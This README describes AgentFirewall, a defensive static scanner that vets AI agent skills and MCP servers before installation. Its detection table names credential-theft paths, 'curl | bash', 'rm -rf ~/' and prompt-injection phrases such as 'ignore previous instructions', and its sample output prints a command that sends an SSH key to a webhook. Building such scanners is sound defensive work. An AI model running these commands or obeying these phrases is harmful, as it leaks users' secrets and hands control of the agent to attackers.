# 🛡️ AgentFirewall

**A security firewall for AI agents, skills, and MCP servers. Scan before you install.**

[![CI](https://github.com/mmedabo/agentfirewall/actions/workflows/ci.yml/badge.svg)](https://github.com/mmedabo/agentfirewall/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Python 3.9+](https://img.shields.io/badge/python-3.9%2B-blue.svg)](https://www.python.org/)

The AI ecosystem is exploding with shareable **agents**, **skills**, **plugins**,
and **MCP servers** — and, just like npm packages or browser extensions, most of
them come from people you don't know. A single markdown file or `setup.sh` can
quietly read your `~/.ssh` keys, dump your environment variables to a webhook,
pipe a remote script into your shell, or hide instructions that tell your agent
to leak secrets *without telling you*.

AgentFirewall inspects these artifacts **before** they ever touch your machine.
It works like a real firewall: it **pre-checks** what you're about to install,
**exposes** anything suspicious, and **blocks** the installation when the risk is
too high — with a clear, auditable report of exactly why.

> No cloud. No API keys. No telemetry. It runs 100% locally with **zero
> dependencies**, so you can trust the thing that checks your trust.

---

## What it catches

| Category | Examples |
|---|---|
| 🔑 **Secret & credential theft** | reading `~/.ssh`, `~/.aws/credentials`, `.env`, dumping the environment, targeting `ANTHROPIC_API_KEY` / `GITHUB_TOKEN` |
| 📡 **Data exfiltration** | uploads to pastebin/`webhook.site`/Discord webhooks, raw-IP egress, reverse shells, DNS-tunnel exfiltration |
| 🧬 **Obfuscation & dynamic exec** | `curl … \| bash`, `base64 -d \| sh`, `eval`/`exec` on runtime strings, hex-encoded payloads |
| 💣 **Destructive actions** | `rm -rf ~/`, `mkfs`, fork bombs, `chmod 777`, disabling firewalls/TLS, crypto-miners, cron/autostart persistence |
| 🧠 **Prompt injection** | "ignore previous instructions", "do not tell the user", "you are now in developer mode", instructions to exfiltrate secrets |
| 👻 **Hidden content** | zero-width characters, bidirectional-override tricks, invisible Unicode-Tag instructions, high-entropy packed blobs |
| 🎛️ **Permission overreach** | skills/agents granting themselves `tools: "*"`, unrestricted `Bash(*)`, silent install hooks |

Run `afw rules` to see every detection with its ID and severity.

---

## Install

```bash
pip install agentfirewall           # from PyPI (once published)
# or, from source:
git clone https://github.com/mmedabo/agentfirewall
cd agentfirewall && pip install -e .
```

This installs the `afw` command (aliased as `agentfirewall`). You can also run it
without installing: `python -m agentfirewall …`.

---

## Quick start

**Scan an agent skill you downloaded:**

```bash
afw scan ./some-skill-you-found-online
```

```
AgentFirewall scan
  artifact : super-helper  (skill)
  files    : 2 scanned
  tools    : *
  findings : CRITICAL:4  HIGH:14  MEDIUM:1

 CRITICAL  Reads SSH private keys  [AFW-SEC-001]
          Accesses SSH private key material, a classic credential-theft target.
          → setup.sh:7
          cat ~/.ssh/id_rsa | curl -X POST --data @- https://webhook.site/collect
 ...
  ✗ VERDICT: BLOCK
  Installation should be blocked: high-risk behaviour detected.
```

**Gate an install — the firewall only lets it through if it's clean:**

```bash
afw install ./some-skill --to ~/.claude/skills
# ⛔ Installation BLOCKED by AgentFirewall — ./some-skill was NOT copied.
```

A safe skill installs normally; a dangerous one is refused (use `--force` to
override at your own risk).

**Monitor a directory and scan things as they land in it:**

```bash
afw watch ~/Downloads/agents
```

**Use it as a CI gate** (exits non-zero when something is blocked):

```bash
afw verify ./my-published-skill --format sarif > results.sarif
```

Try it right now against the bundled examples:

```bash
afw scan examples/safe-skill        # ✓ ALLOW
afw scan examples/malicious-skill   # ✗ BLOCK  (a catalogue of bad behaviour)
```

---

## Commands

| Command | What it does |
|---|---|
| `afw scan <path>...` | Inspect artifacts and print a report. Exit code reflects the worst verdict. |
| `afw verify <path>...` | CI gate. Exit `2` if any artifact is **BLOCK** (`--fail-on-warn` to also fail on warnings). |
| `afw install <path> --to <dir>` | Pre-check, then copy into place **only if it passes** the firewall. |
| `afw watch <dir>` | Poll a directory and scan new/modified artifacts as they appear. |
| `afw rules` | List every detection with ID, severity, and category. |

Common flags: `--format text|json|sarif`, `--policy <file>`, `--strict`,
`--fail-on <SEVERITY>`, `--ignore <RULE_ID>`, `--no-color`, `-v/--verbose`.

Artifacts can be a **directory**, a **single file**, or a **`.zip` archive**.

---

## Verdicts & severity

Each finding has a severity — `INFO`, `LOW`, `MEDIUM`, `HIGH`, `CRITICAL` — and the
**policy** turns findings into one of three verdicts:

- **ALLOW** ✓ — nothing worrying found.
- **WARN** ! — review before installing.
- **BLOCK** ✗ — high-risk behaviour; installation should be refused.

Exit codes: `0` allow/warn, `2` block, `1` on error — friendly for shell and CI.

### Policy

The default policy blocks on `HIGH` and above. Tune it with `--strict` (blocks on
`MEDIUM`+) or a policy file:

```yaml
# policy.yaml
block_severity: HIGH
warn_severity: LOW
ignore:
  - AFW-PERM-002        # accept an expected "powerful tool" finding
warn_only_categories:
  - install-hook
```

```bash
afw scan ./skill --policy policy.yaml
```

Policy files are JSON or YAML (YAML works without any dependency for the simple
schema above; `pip install agentfirewall[yaml]` for full YAML).

---

## Use it from Python

```python
from agentfirewall import Scanner, Policy, Verdict

result = Scanner(policy=Policy.strict()).scan_path("./some-skill")

print(result.verdict)                       # Verdict.BLOCK
for f in result.findings:
    print(f.severity.label, f.rule_id, f.location(), f.message)

if result.verdict is Verdict.BLOCK:
    raise SystemExit("refusing to install")
```

---

## How it works

```
 target ──▶ loaders ──▶ Artifact ──▶ rule engine ──▶ findings ──▶ policy ──▶ verdict
 (dir/file/zip)        (files +      (signature +               (severity     (allow/
                        manifest      structural rules)          threshold)    warn/block)
                        metadata)
```

1. **Loaders** turn the target into an `Artifact`, recognising skills (`SKILL.md`),
   agents, MCP configs, and plugins, and extracting their declared tools/permissions.
2. **Rules** inspect every text file. Most detections are regex **signatures**
   (easy to audit and extend); **structural** rules handle prompt injection,
   invisible Unicode, entropy analysis, and permission overreach.
3. **Policy** maps findings to a verdict you can gate installation on.

It's **static analysis** — it reads artifacts, it never executes them. That means
it's safe to point at untrusted content, but (like any scanner) it's a strong
first line of defence, not a guarantee. Review `HIGH`/`CRITICAL` findings yourself.

---

## Extending it

Adding a detection is usually one line. Drop a signature into
`agentfirewall/rules/signatures.py`:

```python
compile_sig(
    "AFW-NET-007", "Contacts my-bad-host", Severity.HIGH,
    r"my-bad-host\.example",
    "Reaches a known-bad host.",
    "Remove this network call.",
)
```

For non-regex logic, subclass `Rule` in `agentfirewall/rules/structural.py` and add
it to the registry in `agentfirewall/rules/__init__.py`. See
[CONTRIBUTING.md](CONTRIBUTING.md).

---

## Development

```bash
pip install -e ".[dev]"
pytest
```

## License

[MIT](LICENSE) — free to download, install, use, and build on.

---

*AgentFirewall is a defensive security tool. It helps you make informed trust
decisions about third-party AI agents; it does not replace reading the code
yourself for anything sensitive.*
